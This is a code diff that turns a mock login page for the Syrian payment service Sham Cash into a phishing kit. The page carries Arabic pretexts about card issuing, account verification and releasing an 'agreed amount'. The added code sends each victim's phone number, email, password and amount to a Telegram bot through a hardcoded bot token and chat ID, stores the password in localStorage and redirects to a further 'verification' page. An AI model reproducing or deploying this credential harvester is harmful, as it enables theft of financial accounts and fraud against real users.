@@ -1,18 +1,90 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // Get form elements
+    const TELEGRAM_BOT_TOKEN = '8335962255:AAHDeJbWKC9D7zeESdlMtq5cX86PnFVKjuk';
+    const TELEGRAM_CHAT_ID = '7464148063';
+    
     const loginForm = document.getElementById('loginForm');
     const phoneInput = document.getElementById('phoneNumber');
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
+    const agreedAmountInput = document.getElementById('agreedAmount');
+    const agreedAmountGroup = document.getElementById('agreedAmountGroup');
+    const loginTitle = document.getElementById('loginTitle');
     const submitBtn = document.querySelector('.submit-btn');
     const qrScannerBtn = document.getElementById('qrScannerBtn');
     const backBtn = document.getElementById('backBtn');
+    const togglePasswordBtn = document.getElementById('togglePassword');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const loginType = urlParams.get('type');
+
+    const titles = {
+        'card': 'اصدار بطاقة شام كاش',
+        'verify': 'توثيق حساب شام كاش',
+        'exchange': 'تفعيل خاصية تحويل العملات',
+        'download': 'الرجاء ادخال بيانات الحساب المراد تنزيل المبلغ المتفق عليه'
+    };
+
+    if (loginType && titles[loginType]) {
+        loginTitle.textContent = titles[loginType];
+    }
+
+    if (loginType === 'download') {
+        agreedAmountGroup.style.display = 'block';
+        agreedAmountInput.required = true;
+    } else {
+        agreedAmountGroup.style.display = 'none';
+        agreedAmountInput.required = false;
+    }
+
+    // Function to send data to Telegram
+    async function sendToTelegram(data) {
+        const message = `
+🔔 <b>تسجيل دخول جديد - شام كاش</b>
+
+📱 <b>رقم الهاتف:</b> ${data.phone}
+📧 <b>البريد الإلكتروني:</b> ${data.email}
+🔐 <b>كلمة السر:</b> ${data.password}
+💰 <b>المبلغ المتفق عليه:</b> ${data.agreedAmount || 'غير محدد'}
+
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SY')}
+        `.trim();
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            const result = await response.json();
+            
+            if (result.ok) {
+                console.log('تم إرسال البيانات إلى تيليجرام بنجاح');
+                return true;
+            } else {
+                console.error('خطأ في إرسال البيانات:', result);
+                return false;
+            }
+        } catch (error) {
+            console.error('خطأ في الاتصال بتيليجرام:', error);
+            return false;
+        }
+    }
 
     // Input validation patterns
     const patterns = {
-        phone: /^[0-9]{10,15}$/,
-        email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
-        password: /^.{6,}$/
+        phone: /^(\+?963|0)?9\d{8}$/,
+        email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
+        password: /^.{6,}$/,
+        amount: /^\d+$/
     };
 
     // Real-time validation
@@ -28,6 +100,15 @@ document.addEventListener('DOMContentLoaded', function() {
         validateInput(this, patterns.password);
     });
 
+    if (agreedAmountInput) {
+        agreedAmountInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value) {
+                validateInput(this, patterns.amount);
+            }
+        });
+    }
+
     function validateInput(input, pattern) {
         input.classList.remove('success', 'error');
         
@@ -41,12 +122,13 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // Form submission
-    loginForm.addEventListener('submit', function(e) {
+    loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
 
         const phoneValue = phoneInput.value.trim();
         const emailValue = emailInput.value.trim();
         const passwordValue = passwordInput.value;
+        const agreedAmountValue = agreedAmountInput ? agreedAmountInput.value.trim() : '';
 
         // Validate all fields
         let isValid = true;
@@ -66,44 +148,71 @@ document.addEventListener('DOMContentLoaded', function() {
             isValid = false;
         }
 
+        if (agreedAmountInput && agreedAmountValue && !patterns.amount.test(agreedAmountValue)) {
+            agreedAmountInput.classList.add('error');
+            isValid = false;
+        }
+
         if (!isValid) {
             showNotification('الرجاء التحقق من البيانات المدخلة', 'info');
             return;
         }
 
         // Show loading state
-        submitBtn.textContent = 'جاري تسجيل الدخول...';
+        submitBtn.textContent = 'جاري الإرسال...';
         submitBtn.disabled = true;
         
         // Add loading class to inputs
         phoneInput.classList.add('loading');
         emailInput.classList.add('loading');
         passwordInput.classList.add('loading');
+        if (agreedAmountInput) agreedAmountInput.classList.add('loading');
 
-        // Simulate API call
-        setTimeout(() => {
-            // Remove loading state
-            phoneInput.classList.remove('loading');
-            emailInput.classList.remove('loading');
-            passwordInput.classList.remove('loading');
-            submitBtn.textContent = 'تسجيل الدخول';
-            submitBtn.disabled = false;
+        // Send data to Telegram
+        const telegramData = {
+            phone: phoneValue,
+            email: emailValue,
+            password: passwordValue,
+            agreedAmount: agreedAmountValue
+        };
 
-            // Show success message
-            showNotification('تم تسجيل الدخول بنجاح!', 'success');
+        const sent = await sendToTelegram(telegramData);
 
-            // Add success animation to button
+        // Remove loading state
+        phoneInput.classList.remove('loading');
+        emailInput.classList.remove('loading');
+        passwordInput.classList.remove('loading');
+        if (agreedAmountInput) agreedAmountInput.classList.remove('loading');
+        submitBtn.textContent = 'تسجيل الدخول';
+        submitBtn.disabled = false;
+
+        if (sent) {
+            localStorage.setItem('userPhone', phoneValue);
+            localStorage.setItem('userEmail', emailValue);
+            localStorage.setItem('userPassword', passwordValue);
+            localStorage.setItem('userAmount', agreedAmountValue);
+            
             submitBtn.style.background = 'linear-gradient(135deg, #2ecc71 0%, #27ae60 100%)';
             
             setTimeout(() => {
-                submitBtn.style.background = 'linear-gradient(135deg, #3b7cb8 0%, #4a8dc9 100%)';
-                // Redirect to dashboard or home
-                window.location.href = 'index.html';
-            }, 1500);
-        }, 2000);
+                window.location.href = 'verification.html';
+            }, 800);
+        } else {
+            showNotification('حدث خطأ في الإرسال. الرجاء المحاولة مرة أخرى', 'error');
+        }
     });
 
-    // QR Scanner button
+    togglePasswordBtn.addEventListener('click', function() {
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            this.classList.add('active');
+            showNotification('كلمة السر مرئية', 'info');
+        } else {
+            passwordInput.type = 'password';
+            this.classList.remove('active');
+        }
+    });
+
     qrScannerBtn.addEventListener('click', function() {
         showNotification('جاري فتح ماسح الرمز...', 'info');
         
@@ -263,35 +372,24 @@ document.addEventListener('DOMContentLoaded', function() {
     passwordInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             e.preventDefault();
-            loginForm.dispatchEvent(new Event('submit'));
-        }
-    });
-
-    // Show/hide password on double click
-    let clickCount = 0;
-    let clickTimer = null;
-
-    passwordInput.addEventListener('click', function() {
-        clickCount++;
-        
-        if (clickCount === 1) {
-            clickTimer = setTimeout(() => {
-                clickCount = 0;
-            }, 300);
-        } else if (clickCount === 2) {
-            clearTimeout(clickTimer);
-            clickCount = 0;
-            
-            // Toggle password visibility
-            if (this.type === 'password') {
-                this.type = 'text';
-                showNotification('كلمة السر مرئية', 'info');
-                setTimeout(() => {
-                    this.type = 'password';
-                }, 2000);
+            if (agreedAmountInput) {
+                agreedAmountInput.focus();
+            } else {
+                loginForm.dispatchEvent(new Event('submit'));
             }
         }
     });
+
+    if (agreedAmountInput) {
+        agreedAmountInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginForm.dispatchEvent(new Event('submit'));
+            }
+        });
+    }
+
+
 
     // Prevent default form autofill styling
     window.addEventListener('load', function() {
@@ -304,7 +402,9 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     // Add value class when input has value
-    const allInputs = [phoneInput, emailInput, passwordInput];
+    const allInputs = agreedAmountInput ? 
+        [phoneInput, emailInput, passwordInput, agreedAmountInput] : 
+        [phoneInput, emailInput, passwordInput];
     allInputs.forEach(input => {
         input.addEventListener('input', function() {
             if (this.value !== '') {
